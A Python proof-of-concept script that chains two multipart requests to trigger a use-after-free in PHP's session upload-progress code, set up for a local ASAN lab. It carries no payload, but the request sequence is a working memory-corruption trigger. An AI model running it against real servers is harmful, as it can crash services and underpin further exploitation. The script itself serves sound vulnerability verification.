#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cross-request "stale global state" test (CVE-2026-109619, GHSA-6wmf-4rv5-p3rp).

Reproduces the sequence described by the official advisory:

  PRODUCER (request 1)
    Multipart with:
      1. PHP_SESSION_UPLOAD_PROGRESS field -> the rfc1867 hook starts
      2. file field                         -> MULTIPART_EVENT_FILE_START:
                                               publishes the session state
                                               (PS(id), decoder, etc.) BEFORE
                                               the normal RINIT
      3. huge field (64 MB)                 -> OOM during input processing,
                                               with the state already
                                               published -> the reset is
                                               skipped -> the request heap is
                                               freed while the worker global
                                               still points to it
  CONSUMER (request 2, same worker)
    Multipart with PHP_SESSION_UPLOAD_PROGRESS -> the hook reaches the session
    state again BEFORE normal initialisation and treats it as valid -> UAF.

Lab requirements:
  * PHP_CLI_SERVER_WORKERS=1  -> both requests land on the same worker.
  * Low memory_limit (lab/conf.d/99-lab-memory.ini) -> the OOM is reachable.

Expected differential (verified with the lab builds):
  * 8.4.26 (vulnerable) -> ASAN: heap-use-after-free
  * 8.4.27 (patched)     -> no ASAN report

This script contains no exploitation payload and computes no addresses: it only
chains producer and consumer so that ASAN observes the memory error.
"""

import argparse
import socket
import sys
import time

BOUNDARY = "----b"


def part(name, body, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + BOUNDARY.encode() + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def producer_body(sid, oom_field_size):
    """Publishes the session state (file part) and then triggers the OOM."""
    head = (
        part("PHPSESSID", sid.encode()) + b"\r\n"
        + part("PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
        + part("f", b"A" * 64, filename="a") + b"\r\n"
    )
    # Huge value -> OOM while parsing the input.
    return head, part("big", b"B" * oom_field_size) + b"\r\n" + b"--" + BOUNDARY.encode() + b"--\r\n"


def consumer_body(sid):
    """Consumer: upload progress that reaches the session state early."""
    body = (
        part("PHPSESSID", sid.encode()) + b"\r\n"
        + part("PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
        + part("f", b"Z" * 64, filename="b") + b"\r\n"
        + b"--" + BOUNDARY.encode() + b"--\r\n"
    )
    return body


def http_request(host, port, path, body, sid=None, timeout=60):
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    if sid:
        head = head.replace(b"Connection: close", f"Cookie: PHPSESSID={sid}\r\nConnection: close".encode())
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s.sendall(head)
        # send in chunks so the request can be aborted if the server closes
        step = 1 << 20
        for i in range(0, len(body), step):
            try:
                s.sendall(body[i:i + step])
            except (BrokenPipeError, ConnectionResetError):
                break
        s.settimeout(timeout)
        data = b""
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
        except (socket.timeout, OSError):
            pass
        return data
    finally:
        s.close()


def plant_object(mutator_url, sid):
    """Seeds a session holding a serialised object (LAB ONLY)."""
    import urllib.parse
    import urllib.request
    url = f"{mutator_url}?{urllib.parse.urlencode({'sid': sid, 'mode': 'object'})}"
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            print(f"[*] session seeded with object: {r.read().decode().strip()}")
    except Exception as e:  # noqa: BLE001
        print(f"[!] could not seed the session: {e}")


def main():
    ap = argparse.ArgumentParser(description="Cross-request stale global state (CVE-2026-109619)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--path", default="/")
    ap.add_argument("--sid", default="c0ffeec0ffeec0ffeec0ffeec0ffee")
    ap.add_argument("--oom-field-size", type=int, default=24 * 1024 * 1024,
                    help=r"size of the 'big' field: it must fit in memory (body) but "
                         r"exceed the limit when copied into \$_POST -> OOM inside "
                         r"the rfc1867 processing, after FILE_START")
    ap.add_argument("--rounds", type=int, default=3)
    ap.add_argument("--mutator-url", default="http://127.0.0.1:8080/_lab_mutator.php")
    ap.add_argument("--plant-object", action="store_true",
                    help="seeds a session holding a serialised object (publishes "
                         "decoder state during startup, as the advisory describes)")
    args = ap.parse_args()

    head, tail = producer_body(args.sid, args.oom_field_size)
    body = head + tail
    if args.plant_object:
        plant_object(args.mutator_url, args.sid)
    print(f"[*] producer: {len(body)}B ('big' field of {args.oom_field_size}B to force the OOM)")
    print(f"[*] consumer: upload progress multipart (same SID, same worker)")

    for r in range(1, args.rounds + 1):
        print(f"--- round {r}")
        try:
            resp = http_request(args.host, args.port, args.path, body, sid=args.sid)
            line = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"
            print(f"    producer  -> {line} ({len(resp)}B)")
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            print(f"    producer  -> {e.__class__.__name__} (the server closed the connection)")
        time.sleep(0.5)
        try:
            resp2 = http_request(args.host, args.port, args.path, consumer_body(args.sid), sid=args.sid)
            line2 = resp2.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp2 else "NO RESPONSE"
            print(f"    consumer -> {line2} ({len(resp2)}B)")
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            print(f"    consumer -> {e.__class__.__name__} (worker dead: UAF materialised)")
        time.sleep(0.5)

    print("[*] Check ASAN: docker logs php-uaf-lab 2>&1 | grep -B5 -A45 AddressSanitizer")
    return 0


if __name__ == "__main__":
    sys.exit(main())
